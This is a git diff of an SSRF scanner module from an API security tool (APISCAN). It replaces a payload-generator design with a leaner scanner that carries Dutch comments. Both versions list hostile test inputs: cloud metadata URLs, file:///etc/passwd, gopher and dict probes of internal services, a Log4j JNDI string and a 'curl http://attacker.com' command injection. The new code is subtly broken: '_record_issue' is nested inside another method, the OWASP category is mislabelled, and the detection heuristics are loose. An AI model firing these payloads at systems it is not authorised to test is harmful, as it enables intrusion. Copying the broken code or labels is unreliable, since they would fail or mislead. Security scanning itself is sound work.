@@ -1,545 +1,416 @@
-#
-# Licensed under the MIT License. 
-# Copyright (c) 2025 Perry Mertens
-#
-# See the LICENSE file for full license text.
-"""
-ssrf_audit.py – OWASP API7:2023 (Server-Side Request Forgery)
-================================================================
-Enhanced version with:
-- Cloud metadata endpoints (AWS, Azure, GCP, etc.)
-- DNS rebinding payloads
-- Time-based detection
-- Protocol-specific payloads (dict://, sftp://)
-- Improved risk assessment
-- Comprehensive reporting
-"""
-
+##################################
+# APISCAN - API Security Scanner #
+# Licensed under the MIT License #
+# Author: Perry Mertens, 2025    #
+##################################
 from __future__ import annotations
-import argparse
-import ipaddress
+
 import json
-import queue
 import random
-import re
-import socket
-import string
 import threading
 import time
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import socket
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from pathlib import Path
-from typing import Any, Callable, Dict, Iterable, List, Optional, Tuple
-from urllib.parse import quote_plus, urljoin, urlparse
+from typing import Any, Dict, List, Optional
+from urllib.parse import quote_plus, urljoin
+
 import requests
-from report_utils import ReportGenerator
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from report_utils import ReportGenerator  # door Perry samengevoegde helper
+# Schakel waarschuwing uit voor self-signed TLS tijdens tests
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  # type: ignore
 
-
-# ---------------------------------------------------------------------------#
-# Typedefs
-# ---------------------------------------------------------------------------#
 Endpoint = Dict[str, Any]
-Finding = Dict[str, Any]
-PayloadGenerator = Callable[[], Iterable[str]]
-ResponseAnalyzer = Callable[["SSRFAuditor", Endpoint, str, str, requests.Response, float], Optional[Finding]]
+Issue = Dict[str, Any]
 
-# ---------------------------------------------------------------------------#
-# Main class
-# ---------------------------------------------------------------------------#
+
 class SSRFAuditor:
-    """Detect SSRF vulnerabilities (API7 – OWASP API Top 10 / 2023)."""
+    """Voert uitsluitend **API-8 - Server-Side Request Forgery** detectie uit."""
 
-    # ------------------------------------------------------------------#
-    # Class constants
-    # ------------------------------------------------------------------#
-    URL_PARAM_REGEX = re.compile(
-        r"(url|uri|redirect|callback|next|file|path|target|site|link|download)$",
-        re.I,
-    )
-    
-    # Basic internal IPs
-    IPV4_INTERNALS = [
-        "127.0.0.1",
-        "0.0.0.0",
-        "169.254.169.254",  # AWS metadata
-        "169.254.170.2",    # ECS/IMDSv2
-        "10.0.0.1",
-        "172.16.0.1",
-        "192.168.0.1",
-    ]
-    IPV6_INTERNALS = ["[::1]", "[::ffff:127.0.0.1]"]
-    
-    # Cloud metadata endpoints
-    CLOUD_METADATA_URLS = [
-        # AWS
+    # --- configuratie --------------------------------------------------
+    PAYLOADS = [
+        # Cloud metadata services
         "http://169.254.169.254/latest/meta-data/",
-        "http://169.254.169.254/latest/user-data/",
-        # GCP
         "http://metadata.google.internal/computeMetadata/v1/",
-        # Azure
-        "http://169.254.169.254/metadata/instance",
-        # Kubernetes
-        "http://10.96.0.1:10255/pods",
-        # Alibaba
-        "http://100.100.100.200/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/",  # AliCloud
+        # Loopback varianten
+        "http://localhost/",
+        "http://127.0.0.1/",
+        "http://[::1]/",
+        "http://0.0.0.0/",
+        "http://2130706433/",  # 127.0.0.1 in int-vorm
+        "http://127.0.0.1.nip.io/",
+        # Bestands- en protocol-abuse
+        "file:///etc/passwd",
+        "file:///c:/windows/system32/drivers/etc/hosts",
+        "gopher://127.0.0.1:11211/_stats\r\nquit\r\n",
+        # Out-of-band-/ OAST
+        "http://burpcollaborator.net/",
+        "http://127.0.0.1:80/",
+        "http://localhost:22/",
+        "http://169.254.169.254/",  # Zonder specifiek path
+        "dict://127.0.0.1:6379/info",  # Redis
+        "http://localtest.me/",  # Resolves to 127.0.0.1
+        "http://customer.app.localhost.127.0.0.1.nip.io/",
     ]
-    
-    # DNS-rebinding hosts
-    DNS_REBINDING_HOSTS = [
-        "127.0.0.1.nip.io",
-        "localtest.me",
-        "localhost.localdomain",
-        "2130706433",       # Integer IP
-        "0x7f000001",       # Hex IP
-        "0177.0000.0000.0001"  # Octal IP
-    ]
-    
-    # Specific protocols
-    EXTRA_SCHEMES = ["file", "gopher", "ldap", "dict", "sftp", "tftp"]
-    
-    # Configuration
-    DEFAULT_CONCURRENCY = 15
-    DEFAULT_TIMEOUT = 8
-    TIME_DELAY_THRESHOLD = 2.0  # Seconds
 
-    # ------------------------------------------------------------------#
+    LANG_PAYLOADS = [
+        "http://127.0.0.1/%0D%0AConnection:%20keep-alive",  # HTTP header injection
+        "en;http://169.254.169.254",  # Parameter pollution
+        "../../../../etc/passwd",     # Path traversal
+        "${jndi:ldap://attacker.com}", # Log4j
+        "en|curl http://attacker.com", # Command injection
+    ]
+
+    MAX_CONCURRENCY = 10
+    DEFAULT_TIMEOUT = 8
+    DEFAULT_RPS = 8
+    BLIND_THRESHOLD = 4  # seconden
+
+    # -------------------------------------------------------------------
     def __init__(
         self,
         base_url: str,
         session: Optional[requests.Session] = None,
         *,
-        collaborator: Optional[str] = None,
-        concurrency: int = DEFAULT_CONCURRENCY,
+        concurrency: int = MAX_CONCURRENCY,
+        rps: int = DEFAULT_RPS,
         timeout: int = DEFAULT_TIMEOUT,
-        rate_limit_sleep: float = 0.0,
+        verify_tls: bool = False,
     ) -> None:
         self.base_url = base_url.rstrip("/")
-        self.session = session or requests.Session()
-        self.collaborator = collaborator
+        self.sess = session or requests.Session()
+        self.sess.verify = verify_tls
         self.concurrency = concurrency
+        self.rps = rps
         self.timeout = timeout
-        self.rate_sleep = rate_limit_sleep
-        self.session.headers.update({
-            "User-Agent": "SSRF-Auditor/1.0"
-        })
 
-        self._payload_generators: List[PayloadGenerator] = [self._default_payloads]
-        self._payload_generators: List[PayloadGenerator] = [self._default_payloads, self._advanced_payloads]
-        self._response_analyzers: List[ResponseAnalyzer] = [self._default_analyzer]
-        self._findings: List[Finding] = []
+        self._last_ts = 0.0
         self._lock = threading.Lock()
-        self._oob_hits: queue.Queue[str] = queue.Queue()
+        self._issues: List[Issue] = []
 
-        # Register additional payload generators
-        self._register_extra_generators()
+    # ------------------------------------------------------------------
+    @staticmethod
+    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str = "") -> List[Endpoint]:
+        """Parse (Open)API spec and return a list of endpoint dicts **including a full `url` key**.
 
-        # Start (optional) background OOB-checker
-        if self.collaborator:
-            threading.Thread(
-                target=self._fake_oob_listener, daemon=True, name="oob-listener"
-            ).start()
-
-    def _register_extra_generators(self):
-        """Register additional payload generators."""
-        self.register_payload_generator(self._cloud_metadata_payloads)
-        self.register_payload_generator(self._dns_rebinding_payloads)
-        self.register_payload_generator(self._protocol_specific_payloads)
-
-    # ------------------------------------------------------------------#
-    # Public API
-    # ------------------------------------------------------------------#
-    def register_payload_generator(self, gen: PayloadGenerator) -> None:
-        self._payload_generators.append(gen)
-
-    def register_response_analyzer(self, fn: ResponseAnalyzer) -> None:
-        self._response_analyzers.append(fn)
-
-    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Finding]:
-        """Execute SSRF tests across all endpoints."""
-        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
-            futures = [pool.submit(self._test_single_endpoint, ep) for ep in endpoints]
-            for _ in as_completed(futures):
-                pass
-        return self._findings
-
-    # ------------------------------------------------------------------#
-    # Discovery helpers
-    # ------------------------------------------------------------------#
-    @classmethod
-    def endpoints_from_swagger(cls, swagger_path: str) -> List[Endpoint]:
-        """Parse Swagger/OpenAPI and collect endpoints with URL-like params."""
+        apiscan.py expects each entry to have:
+            {"method": "GET", "path": "/pets", "url": "https://api.example.com/pets", ...}
+        """
         spec = json.loads(Path(swagger_path).read_text(encoding="utf-8"))
-        server = _spec_base_url(spec)
-        eps: List[Endpoint] = []
+        server_decl = spec.get("servers", [{}])
+        server = server_decl[0].get("url", "") if server_decl else ""
+        base = server or default_base
 
-        def _iter_parameters(item: dict) -> Iterable[dict]:
-            # Combine path + operation parameters
-            return (item.get("parameters", []) +
-                    item.get("get", {}).get("parameters", []) +
-                    item.get("post", {}).get("parameters", []) +
-                    item.get("put", {}).get("parameters", []) +
-                    item.get("patch", {}).get("parameters", []) +
-                    item.get("delete", {}).get("parameters", []))
-
+        endpoints: List[Endpoint] = []
         for path, item in spec.get("paths", {}).items():
-            for method in ("get", "post", "put", "patch", "delete"):
-                if method not in item:
-                    continue
-                op = item[method]
-                params = _iter_parameters({"parameters": item.get("parameters", [])} | op)
-                url_like = [p for p in params if cls.URL_PARAM_REGEX.search(p.get("name", ""))]
-                if url_like:
-                    eps.append(
-                        {
-                            "base": server or "",
-                            "path": path,
-                            "method": method.upper(),
-                            "param_defs": url_like,
-                            "operation_id": op.get("operationId", f"{method.upper()} {path}"),
-                        }
-                    )
-        return eps
+            for method in item.keys():
+                full_url = urljoin(base, path.lstrip("/"))
+                endpoints.append({
+                    "method": method.upper(),
+                    "path": path,
+                    "base": base,
+                    "url": full_url,
+                })
+        return endpoints
 
-    # ------------------------------------------------------------------#
-    # Core tester
-    # ------------------------------------------------------------------#
-    def _test_single_endpoint(self, ep: Endpoint):
-        for param_def in ep["param_defs"]:
-            for payload in self._generate_payloads():
-                crafted = self._build_request(ep, param_def, payload)
-                try:
-                    start = time.time()
-                    resp = self.session.request(
-                        crafted["method"],
-                        crafted["url"],
-                        **crafted["send_kwargs"],
-                        timeout=self.timeout,
-                        allow_redirects=False,
-                    )
-                    dur = time.time() - start
-                except requests.RequestException as exc:
-                    resp = _dummy_response(str(exc))
-                    dur = self.timeout
+    # ------------------------------------------------------------------
+    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
+        """Scan alle endpoints en retourneer lijst met findings."""
+        print(f"[+] Start SSRF scan op {len(endpoints)} endpoints...")
+        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
+            pool.map(self._scan_endpoint, endpoints)
+        print("[+] SSRF scan afgerond.")
+        return self._issues
 
-                # Response analysis
-                for analyzer in self._response_analyzers:
-                    finding = analyzer(self, ep, param_def["name"], payload, resp, dur)
-                    if finding:
-                        self._record_finding(finding)
-
-                if self.rate_sleep:
-                    time.sleep(self.rate_sleep)
-
-    # ------------------------------------------------------------------#
-    # Request builder
-    # ------------------------------------------------------------------#
-    def _build_request(self, ep: Endpoint, param_def: dict, payload: str):
-        method = ep["method"].upper()
-        raw_path = ep["path"]
-        url = urljoin(ep.get("base") or self.base_url, raw_path.lstrip("/"))
-        params: Dict[str, Any] = {}
-        json_body: Optional[dict] = None
-
-        # ❗ Copy default headers (like User-Agent)
-        headers = dict(self.session.headers)
-
-        if param_def.get("in") == "path":
-            placeholder = "{" + param_def["name"] + "}"
-            url = url.replace(placeholder, quote_plus(payload))
-        elif param_def.get("in") == "query":
-            params[param_def["name"]] = payload
-        elif param_def.get("in") == "header":
-            headers[param_def["name"]] = payload
-        else:
-            json_body = {param_def["name"]: payload}
-
-        return {"method": method, "url": url, "send_kwargs": {"params": params, "json": json_body, "headers": headers}}
-
-    # ------------------------------------------------------------------#
-    # Payload generators
-    # ------------------------------------------------------------------#
-    def _default_payloads(self) -> Iterable[str]:
-        """Combination of original + new advanced SSRF payloads."""
-        nonce = "".join(random.choices(string.ascii_lowercase, k=6))
-        if self.collaborator:
-            dns_oob = f"http://{nonce}.{self.collaborator}/"
-        else:
-            dns_oob = None
-
-        # Basic candidates
-        ips = self.IPV4_INTERNALS + self.IPV6_INTERNALS
-        base = [f"http://{ip}/" for ip in ips]
-
-        # Extra rare IP representations
-        rare_ips = [
-            "http://0177.0.0.1/",          # Octal IP
-            "http://2130706433/",           # Integer IP
-            "http://0x7f000001/",           # Hex IP
-            "http://127.1/",               # Compact IP
-            "http://127.0.1/",              # Alt. localhost
+    # ------------------------------------------------------------------
+    # interne helpers
+    def _scan_endpoint(self, ep: Endpoint) -> None:
+        print(f"[*] SSRF scan: {ep['method']} {ep['path']}") 
+        base = ep.get("base") or self.base_url
+        url_base = urljoin(base, ep["path"].lstrip("/"))
+        method = ep["method"]
+        
+        # Parameter detectie optimalisatie
+        parameters = ep.get("parameters", [])
+        param_names = {p["name"] for p in parameters if p["in"] in ["query", "header", "path"]}
+        
+        # Combineer met standaard parameters (zonder duplicates)
+        COMMON_PARAMS = {"url", "endpoint", "host", "server", "target", 
+                        "lang", "language", "locale", "v", "version", "api"}
+        all_params = param_names.union(COMMON_PARAMS)
+        
+        # Specifieke payloads voor taal/version parameters
+        LANG_PAYLOADS = [
+            "http://127.0.0.1/%0D%0AConnection:%20keep-alive",
+            "en;http://169.254.169.254",
+            "../../../../etc/passwd",
+            "${jndi:ldap://attacker.com}",
+            "en|curl http://attacker.com",
         ]
-
-        # Fancy vectors
-        fancy = [
-            f"http://{ips[0]}#@example.com",
-            f"http://user:pass@{ips[0]}/",
-            f"http://{ips[0]}@example.com/",
-            f"http://example.com@{ips[0]}/",
-            f"http://¤.{ips[0]}/",
-            "http://example.com%2f..%2f..%2f",
-            "http://localtest.me/",
-            "http://127.0.0.1.nip.io/",
-            "http://example.com@127.0.0.1/",
-        ]
-
-        # Protocol tricks
-        protocols = [
-            "file:///etc/passwd",
-            "gopher://127.0.0.1:22/_SSH",
-            "dict://127.0.0.1:22/info",
-        ]
-
-        # Unicode/encoding bypasses
-        unicode = [
-            "http://127。0。0。1/",
-            "http://127%E3%80%820%E3%80%820%E3%80%821/",
-        ]
-
-        # CRLF / header smuggling
-        crlf = [
-            f"http://example.com/%0d%0aHost:%20{ips[0]}",
-        ]
-
-        # OOB
-        oob = [dns_oob] if dns_oob else []
-
-        # Combine everything
-        return base + rare_ips + fancy + protocols + unicode + crlf + oob
-
-    def _cloud_metadata_payloads(self) -> Iterable[str]:
-        """Generate cloud-metadata payloads."""
-        for url in self.CLOUD_METADATA_URLS:
-            yield url
-            yield url.replace("http://", "http://user:pass@")  # Auth bypass
-            yield url.replace("http://", "http://attacker.com@")  # Host-header injection
-
-    def _dns_rebinding_payloads(self) -> Iterable[str]:
-        """Generate DNS-rebinding payloads."""
-        for host in self.DNS_REBINDING_HOSTS:
-            yield f"http://{host}/"
-            yield f"http://{host}:80@example.com/"
-            yield f"http://example.com@{host}/"
-            yield f"http://attacker.com@{host}/"
-
-    def _protocol_specific_payloads(self) -> Iterable[str]:
-        """Special protocol handlers."""
-        for proto in self.EXTRA_SCHEMES:
-            yield f"{proto}://127.0.0.1/"
-            yield f"{proto}://localhost/"
-            yield f"{proto}://attacker.com@127.0.0.1/"
-    
-    def _advanced_payloads(self) -> Iterable[str]:
-        """Advanced SSRF payloads including bypass techniques."""
-        nonce = "".join(random.choices(string.ascii_lowercase, k=6))
-
-        if self.collaborator:
-            dns_oob = f"http://{nonce}.{self.collaborator}/"
-        else:
-            dns_oob = None
-
-        return [
-            # Direct localhost IP's
-            "http://127.0.0.1/",
-            "http://localhost/",
-            "http://0.0.0.0/",
-            "http://[::1]/",
+        
+        # Eén gecombineerde scanlus voor efficiëntie
+        for param in all_params:
+            # Standaard payloads voor alle parameters
+            for payload in random.sample(self.PAYLOADS, len(self.PAYLOADS)):
+                self._probe_params(ep, url_base, method, param, payload)
             
-            # Unicode tricks
-            "http://127。0。0。1/",
-            "http://localhost%E3%80%82/",
-            
-            # URL encoded IP tricks
-            "http://127%2e0%2e0%2e1/",
-            "http://%31%32%37.0.0.1/",
-            
-            # Username@hostname tricks
-            "http://127.0.0.1@evil.com/",
-            "http://evil.com@127.0.0.1/",
-            "http://localhost@evil.com/",
-            
-            # Open redirect basis
-            "https://trusted.com/redirect?to=http://127.0.0.1",
-            "https://trusted.com/redirect?next=http://localhost",
-            
-            # DNS rebinding tricks
-            "http://127.0.0.1.nip.io/",
-            "http://localhost.nip.io/",
-            "http://127.0.0.1.localtest.me/",
-            
-            # Protocol-based attacks
-            "gopher://127.0.0.1:11211/_stats",
-            "gopher://127.0.0.1:3306/",
-            "file:///etc/passwd",
-            "dict://127.0.0.1:22/info",
-            
-            # Collaborator for OOB SSRF
-            dns_oob if dns_oob else "",
-        ]
-
-    # ------------------------------------------------------------------#
-    # Response analysis
-    # ------------------------------------------------------------------#
-    
-    def _default_analyzer(
+            # Extra payloads voor taal/version parameters
+            if param in {"lang", "language", "locale", "v", "version"}:
+                for payload in LANG_PAYLOADS:
+                    self._probe_params(ep, url_base, method, param, payload)
+   
+    def _probe(
         self,
         ep: Endpoint,
-        param: str,
+        url: str,
+        method: str,
+        *,
         payload: str,
-        resp: requests.Response,
-        dur: float,
-    ) -> Optional[Finding]:
-        reason = None
-        severity = "Low"
-        response_headers = dict(resp.headers)  # Copy headers for reporting
+        param: str = None,
+        json_body: Optional[dict] = None,
+        data: Optional[dict] = None,
+        headers: Optional[dict] = None,
+    ) -> None:
+        """
+        Voert een SSRF test uit en detecteert reflecties en blinde SSRF vulnerabilities.
+        
+        Args:
+            ep: Endpoint informatie
+            url: Target URL
+            method: HTTP methode
+            payload: SSRF payload die geïnjecteerd wordt
+            param: Parameter naam waarin geïnjecteerd wordt
+            json_body: Optionele JSON body
+            data: Optionele form data
+            headers: Optionele headers
+        """
+        # Rate limiting
+        with self._lock:
+            gap = 1 / self.rps
+            delta = time.time() - self._last_ts
+            if delta < gap:
+                time.sleep(gap - delta)
+            self._last_ts = time.time()
 
-        # 1. Cloud Metadata Detection
-        if any(url in payload for url in self.CLOUD_METADATA_URLS):
-            if "Instance Metadata" in resp.text or "iam" in resp.text:
-                reason = "Cloud metadata endpoint accessible"
-                severity = "Critical"
-
-        # 2. DNS Rebinding Detection
-        elif any(host in payload for host in self.DNS_REBINDING_HOSTS):
-            if resp.status_code == 200 and len(resp.text) > 0:
-                reason = "DNS-rebinding possible via host-header manipulation"
-                severity = "High"
-
-        # 3. Time-Based Detection
-        elif dur > self.TIME_DELAY_THRESHOLD:
-            reason = f"Time delay ({dur:.2f}s) → possible internal connection"
-            severity = "Medium"
-
-        # 4. Payload reflection
-        elif payload in resp.text:
-            reason = "Payload reflected → possible SSRF via echo"
-            severity = "High"
-
-        # 5. Redirect to internal IP
-        elif resp.headers.get("Location", "") and any(
-            ip in resp.headers["Location"] for ip in self.IPV4_INTERNALS + self.IPV6_INTERNALS
-        ):
-            reason = f"Redirect to internal host ({resp.headers['Location']})"
-            severity = "High"
-
-        # 6. Out-of-band hit
         try:
-            while True:
-                oob = self._oob_hits.get_nowait()
-                if oob == payload:
-                    reason = "OOB-DNS hit confirmed"
-                    severity = "Critical"
-        except queue.Empty:
-            pass
+            # Prepare request
+            req_headers = headers or {}
+            if not req_headers.get('User-Agent'):
+                req_headers['User-Agent'] = 'SSRF-Auditor/1.0'
+                
+            start = time.time()
+            resp = self.sess.request(
+                method,
+                url,
+                json=json_body,
+                data=data,
+                headers=req_headers,
+                timeout=self.timeout,
+                allow_redirects=False,  # Redirects kunnen SSRF maskeren
+                verify=False  # Voor testdoeleinden
+            )
+            latency = time.time() - start
 
-        if reason:
-            finding = {
+            # Analyze response
+            body = resp.text.lower()
+            host = urlparse(payload).netloc.split(':')[0].lower()
+            
+            # Verbeterde reflectie detectie
+            reflected = self._detect_reflection(body, payload, param, host)
+            
+            # Verbeterde blind SSRF detectie
+            blind = (
+                resp.status_code in {400, 502, 503, 504, 522, 524} or  # Uitgebreide error codes
+                latency > self.BLIND_THRESHOLD or
+                any(keyword in body for keyword in [
+                    "error", 
+                    "timeout", 
+                    "refused",
+                    "internal server error",
+                    "bad gateway"
+                ])
+            )
+
+            if reflected or blind:
+                note = (
+                    f"Reflected SSRF via parameter '{param}'" 
+                    if param and reflected 
+                    else "Reflected SSRF" if reflected 
+                    else "Possible blind SSRF"
+                )
+                self._record_issue(
+                    ep=ep,
+                    payload=payload,
+                    status=resp.status_code,
+                    latency=latency,
+                    note=note,
+                    param=param,
+                    request_headers=req_headers,
+                    response_headers=dict(resp.headers),
+                    response_body=resp.text[:1000]  # Bewaar eerste 1000 chars
+                )
+
+        except requests.RequestException as e:
+            if any(err in str(e).lower() for err in ["refused", "timeout", "reset", "connection"]):
+                self._record_issue(
+                    ep=ep,
+                    payload=payload,
+                    status=0,
+                    latency=0,
+                    note=f"Possible blind SSRF (error: {str(e)[:100]})",
+                    param=param
+                )
+
+    def _detect_reflection(self, body: str, payload: str, param: str = None, host: str = None) -> bool:
+        """
+        Detecteert of de payload of gerelateerde patronen gereflecteerd worden in de response.
+        
+        Args:
+            body: Response body (lowercase)
+            payload: Oorspronkelijke payload
+            param: Parameter naam waarin geïnjecteerd is
+            host: Host uit de payload
+            
+        Returns:
+            bool: True als reflectie gedetecteerd wordt
+        """
+        payload_lc = payload.lower()
+        
+        # Directe payload reflectie
+        if payload_lc in body:
+            return True
+            
+        # Host reflectie (zonder protocol)
+        if host and host in body:
+            return True
+            
+        # Parameter-specifieke patronen
+        if param:
+            param_lc = param.lower()
+            patterns = [
+                f"{param_lc}=",               # Parameter in response
+                f"invalid {param_lc}",         # Validatie errors
+                f"unknown {param_lc}",
+                f"unsupported {param_lc}",
+                f"missing {param_lc}",
+                f"{param_lc} invalid",
+                f"{param_lc} required",
+                f"{param_lc} must be",        # Validatie messages
+                f"invalid value for {param_lc}"
+            ]
+            if any(p in body for p in patterns):
+                return True
+        
+        # Generieke SSRF indicatoren
+        ssrf_indicators = [
+            "localhost",
+            "127.0.0.1",
+            "169.254.169.254",
+            "metadata.google.internal",
+            "internal server error",
+            "forbidden",
+            "not allowed"
+        ]
+        return any(indicator in body for indicator in ssrf_indicators)
+
+
+    def _probe_params(self, ep: Endpoint, base_url: str, method: str, param: str, payload: str):
+        """Test SSRF in verschillende parameter contexten"""
+        
+        # 1. Query parameters (/?param=payload)
+        qs = f"{base_url}?{param}={quote_plus(payload)}"
+        self._probe(ep, qs, method, payload=payload, param=param)
+        
+        # 2. JSON body (POST/PUT/PATCH)
+        if method in {"POST", "PUT", "PATCH"}:
+            self._probe(ep, base_url, method, 
+                    json_body={param: payload},
+                    payload=payload,
+                    param=param)
+        
+        # 3. Form data
+        if method in {"POST", "PUT", "PATCH"}:
+            self._probe(ep, base_url, method,
+                    data={param: payload},
+                    payload=payload,
+                    param=param)
+        
+        # 4. Headers
+        headers = {param: payload}
+        self._probe(ep, base_url, method,
+                headers=headers,
+                payload=payload,
+                param=param)
+        
+        # 5. Path parameters (/users/{param}/profile)
+        if "{" + param + "}" in base_url:
+            path_url = base_url.replace("{" + param + "}", quote_plus(payload))
+            self._probe(ep, path_url, method,
+                    payload=payload,
+                    param=param)
+
+    
+        def _record_issue(
+            self, 
+            ep: Endpoint, 
+            payload: str, 
+            status: int, 
+            latency: float, 
+            note: str, 
+            param: str = None,
+            request_headers: Optional[dict] = None,
+            response_headers: Optional[dict] = None,
+            response_body: Optional[str] = None
+        ) -> None:
+            issue = {
                 "endpoint": f"{ep['method']} {ep['path']}",
-                "parameter": param,
+                "parameter": param or "N/A",
                 "payload": payload,
-                "result": reason,
-                "severity": severity,
-                "timestamp": datetime.now().isoformat(timespec="seconds"),
-                "response_time": f"{dur:.2f}s",
-                "status_code": resp.status_code,
-                "response_headers": response_headers,  # Add headers
+                "status_code": status,
+                "latency": round(latency, 2),
+                "description": note,
+                "severity": "High" if "Reflected" in note else "Medium",
+                "timestamp": datetime.utcnow().isoformat(),
+                "request_headers": request_headers or {},
+                "response_headers": response_headers or {},
+                "response_body": response_body or "",
             }
             
-            # Add response body sample (limited to first 200 chars)
-            if resp.text:
-                finding["response_sample"] = resp.text[:200]
-            
-            return finding
-        return None
-
-    # ------------------------------------------------------------------#
-    # Helpers
-    # ------------------------------------------------------------------#
-    def _record_finding(self, finding: Finding) -> None:
-        with self._lock:
-            self._findings.append(finding)
-
-    def _fake_oob_listener(self):
-        """Simulates OOB-hits; replace with real DNS/HTTP listener."""
-        while True:
-            time.sleep(3600)
-
-    def _is_internal_ip(self, ip_str: str) -> bool:
-        """Check if IP is internal (RFC1918, localhost, etc.)."""
-        try:
-            ip = ipaddress.ip_address(ip_str)
-            return ip.is_private or ip.is_loopback
-        except ValueError:
-            return False
-
-    # ------------------------------------------------------------------#
-    # Reporting
-    # ------------------------------------------------------------------#
-    def generate_report(self, fmt: str = "markdown") -> str:
-        return ReportGenerator(
-            issues=self._findings,
-            scanner="SSRF (API10)",
-            base_url=self.base_url
-        ).generate_markdown() if fmt == "markdown" else ReportGenerator(
-            issues=self._findings,
-            scanner="SSRF (API10)",
-            base_url=self.base_url
-        ).generate_json()
+            with self._lock:
+                # Deduplicatie op endpoint + parameter + payload
+                key = (issue["endpoint"], issue["parameter"], issue["payload"])
+                if not any((i["endpoint"], i["parameter"], i["payload"]) == key 
+                    for i in self._issues):
+                    print(f"[!] SSRF finding: {issue['description']} on {issue['endpoint']} (param: {param})")
+                    self._issues.append(issue)
         
-    def save_report(self, path: str, fmt: str = "markdown"):
-        ReportGenerator(self._findings, scanner="SSRF", base_url=self.base_url).save(path, fmt=fmt)
+        # ------------------------------------------------------------------
+    # rapportage-helpers
+    def _filtered_findings(self) -> List[Issue]:
+        """Return current unique findings (dedupe al in _record_issue)."""
+        return self._issues
 
+    def generate_report(self, fmt: str = "html") -> str:
+        issues = self._filtered_findings()
+        if not issues:
+            issues.append({
+                "endpoint": "-",
+                "method": "INFO",
+                "description": "No SSRF findings detected",
+                "severity": "Info",
+                "status_code": 200,
+                "timestamp": datetime.utcnow().isoformat(),
+                "request_headers": {},
+                "response_headers": {},
+                "request_body": None,
+                "response_body": "",
+            })
+        gen = ReportGenerator(issues, scanner="SSRF (API8)", base_url=self.base_url)
+        return gen.generate_html() if fmt == "html" else gen.generate_markdown()
 
-
-# ---------------------------------------------------------------------------#
-# CLI
-# ---------------------------------------------------------------------------#
-def _spec_base_url(spec: dict) -> str | None:
-    """Best-effort: get first servers[].url or swagger.host/basePath."""
-    if "servers" in spec and spec["servers"]:
-        return spec["servers"][0].get("url", "")
-    if "host" in spec:
-        scheme = spec.get("schemes", ["https"])[0]
-        base = spec.get("basePath", "")
-        return f"{scheme}://{spec['host']}{base}"
-    return None
-
-def _dummy_response(exc_str: str) -> requests.Response:
-    resp = requests.Response()
-    resp.status_code = 599
-    resp._content = exc_str.encode()
-    resp.headers = {}
-    return resp
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Audit OWASP API7 – SSRF")
-    parser.add_argument("--url", required=True, help="Base API URL")
-    parser.add_argument("--swagger", required=True, help="Path to Swagger/OpenAPI-JSON")
-    parser.add_argument("--collaborator", help="OOB domain (optional)")
-    parser.add_argument("--concurrency", type=int, default=SSRFAuditor.DEFAULT_CONCURRENCY)
-    parser.add_argument("--timeout", type=int, default=SSRFAuditor.DEFAULT_TIMEOUT)
-    parser.add_argument("--rate-limit", type=float, default=0.0, help="Wait time between requests")
-    parser.add_argument("--output", choices=["markdown", "json", "csv"], default="markdown")
-    args = parser.parse_args()
-
-    sess = requests.Session()
-    aud = SSRFAuditor(
-        args.url,
-        sess,
-        collaborator=args.collaborator,
-        concurrency=args.concurrency,
-        timeout=args.timeout,
-        rate_limit_sleep=args.rate_limit,
-    )
-    eps = SSRFAuditor.endpoints_from_swagger(args.swagger)
-    aud.test_endpoints(eps)
-    print(aud.generate_report(args.output))
+    def save_report(self, path: str, fmt: str = "html") -> None:
+        Path(path).write_text(self.generate_report(fmt), encoding="utf-8")
